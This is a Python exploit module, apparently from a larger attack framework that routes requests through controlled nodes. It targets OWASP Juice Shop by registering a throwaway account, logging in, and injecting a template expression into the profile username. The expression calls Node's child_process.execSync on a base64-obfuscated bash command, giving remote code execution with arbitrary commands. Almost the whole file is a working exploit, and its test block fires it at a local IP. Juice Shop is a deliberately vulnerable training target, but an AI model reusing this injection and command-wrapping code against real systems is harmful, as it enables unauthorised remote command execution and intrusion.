import time
import warnings

warnings.filterwarnings("ignore")

import base64
import os
import random
import string
import sys
from typing import TYPE_CHECKING, cast
from urllib.parse import quote

import requests
from bs4 import BeautifulSoup

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils import Exploiter

if TYPE_CHECKING:
    from main import ControledNode, LocalNode


def random_string(
    length: int | tuple[int, int] | None = None,
    chars: str = string.ascii_letters + string.digits,
) -> str:
    if not length:
        length = random.randint(10, 50)
    if isinstance(length, tuple):
        length = random.randint(*length)
    return "".join(random.choice(chars) for _ in range(length))


def random_email() -> str:
    return (
        f"{random_string(random.randint(5,15))}@"
        f"{random_string(random.randint(5,15))}.{random.choice(('com','org','cn','edu'))}"
    )


class JuiceShopExploiter(Exploiter):
    def __init__(self, ip: str):
        super().__init__(ip)
        self.prefix = f"http://{self.ip}:3000"
        self.is_rce = True
        self.is_endpoint = False

    def encode_cmd(self, cmd: str) -> str:
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        return f"echo {cmd_b64} | base64 -d | /bin/bash"

    def register(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        self.email = random_email()
        self.password = random_string(10)

        res = proxier.send_request(
            "get",
            f"{self.prefix}/api/SecurityQuestions",
        ).json()["data"]

        # print(res)

        sequerity_questions = cast(list[dict[str, str]], res)
        payload = {
            "email": self.email,
            "password": self.password,
            "passwordRepeat": self.password,
            "securityQuestion": random.choice(sequerity_questions),
            "securityAnswer": random_string(),
        }

        res = proxier.send_request(
            "post",
            f"{self.prefix}/api/Users",
            json=payload,
        ).json()["data"]

        self.id = cast(dict[str, int], res)["id"]
        self.security_question = payload["securityQuestion"]
        self.security_answer = payload["securityAnswer"]

    def login(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        res = proxier.send_request(
            "post",
            f"{self.prefix}/rest/user/login",
            json={
                "email": self.email,
                "password": self.password,
            },
        ).json()

        # print(res)

        self.token = res["authentication"]["token"]
        self.bid = res["authentication"]["bid"]

        proxier.session.cookies.set("token", self.token)
        proxier.session.headers["Authorization"] = f"Bearer {self.token}"

    def check_executed(self, cmd: str) -> str:
        return f"""if ! grep -q 'executed {cmd}' /tmp/executed.txt > /dev/null 2>&1; then echo 'executed {cmd}' >> /tmp/executed.txt; {cmd}; fi"""

    def exploit_rce_init(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        pass

    def exploit_rce(
        self, proxier: "ControledNode | LocalNode | LocalNodeFake", cmd
    ) -> str:
        self.register(proxier)
        self.login(proxier)
        # print("^", cmd)

        first_encoded_cmd = self.encode_cmd(cmd)
        # print("^", first_encoded_cmd)

        second_encoded_cmd = self.check_executed(first_encoded_cmd)
        # print("^", second_encoded_cmd)

        encoded_cmd = self.encode_cmd(second_encoded_cmd)
        # encoded_cmd = first_encoded_cmd

        expr = f"global.process.mainModule.require('child_process').execSync('{encoded_cmd}')"
        print(">", expr)
        proxier.send_request(
            "post", f"{self.prefix}/profile", data={"username": "#{" + expr + "}"}
        )

        res = proxier.send_request("get", f"{self.prefix}/profile")

        return res.text

    def exploit_no_rce(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        res = self.exploit_rce(proxier, "whoami")
        print("<", res)


if __name__ == "__main__":

    class LocalNodeFake:
        def __init__(self):
            self.session = requests.Session()

        def send_request(self, method: str, *argvs, **argv):
            if method.upper() == "GET":
                return self.session.get(*argvs, **argv)
            elif method.upper() == "POST":
                return self.session.post(*argvs, **argv)
            else:
                raise Exception("Method not supported")

    local_node_fake = LocalNodeFake()
    exploiter = JuiceShopExploiter("192.168.123.4")
    exploiter.exploit_rce_init(local_node_fake)
    exploiter.exploit_rce(local_node_fake, "touch /tmp/success")
    exploiter.exploit_no_rce(local_node_fake)
